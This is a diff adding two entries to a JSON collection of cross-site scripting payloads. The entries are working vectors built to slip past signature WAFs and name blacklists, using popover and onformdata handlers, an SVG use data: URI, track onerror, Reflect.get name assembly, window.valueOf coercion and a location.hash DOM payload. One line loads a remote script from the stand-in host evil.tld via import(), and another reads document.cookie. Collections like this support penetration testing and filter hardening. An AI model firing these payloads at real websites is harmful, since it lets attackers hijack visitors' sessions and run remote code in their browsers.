@@ -785,6 +785,22 @@
       "tags": ["mxss", "mutation", "dompurify"],
       "body": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
       "meta": "Uses browser quirks to reassemble HTML tags via innerHTML mutations. Masato Kinugawa's example against cure53/DOMPurify on Google Search."
+    },
+    {
+      "subcategory": "Modern vectors",
+      "title": "Modern auto-events and wrappers (popover, onformdata, import)",
+      "language": "html",
+      "tags": ["modern", "waf-bypass", "popover", "import"],
+      "body": "<!-- Popover API (HTML 2023+): ontoggle / onbeforetoggle when the popover opens -->\n<button popovertarget=p>click</button><div id=p popover onbeforetoggle=alert(1)>x</div>\n\n<!-- SVG <use> with an external data: document (the filter waits for inline <script>, there is none) -->\n<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>\n\n<!-- onformdata: fires on form submit -->\n<form onformdata=alert(1)><button>send</button></form>\n\n<!-- Dynamic import(): loads an ES module when eval/Function are blacklisted -->\n<img src=x onerror=\"import('//evil.tld/x.js')\">\n\n<!-- <track> inside media -->\n<video controls><track default onerror=alert(1)></video>",
+      "meta": "Low-profile modern vectors against signature WAFs that do not know these tags/handlers yet: Popover API (onbeforetoggle/ontoggle), <svg><use> with a data: URI, onformdata on submit, dynamic import() as an eval replacement, <track onerror>. popover/track need interaction or a media context."
+    },
+    {
+      "subcategory": "Modern vectors",
+      "title": "Alternative call: Reflect.get, valueOf, hash",
+      "language": "javascript",
+      "tags": ["filter-bypass", "obfuscation", "reflect", "dom"],
+      "body": "// Reflect.get builds the name from parts (like obj['name']), bypassing a name blacklist\nReflect.get(window,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))\n\n// window.valueOf=alert + arithmetic on window: implicit coercion calls alert\nwindow.valueOf=alert;window+1\n\n// payload travels in the #fragment (server WAF never sees it, runs in the DOM)\n<svg onload=\"location=location.hash.slice(1)\">  // open as ...#javascript:alert(1)",
+      "meta": "Reflect.get(obj,'name') reads a property by an assembled string instead of dot notation (function-name blacklist bypass). window.valueOf=alert plus arithmetic on window triggers alert via implicit number coercion. location.hash.slice(1) carries the payload into the #fragment, invisible to a server-side WAF (pure DOM XSS)."
     }
   ]
 }
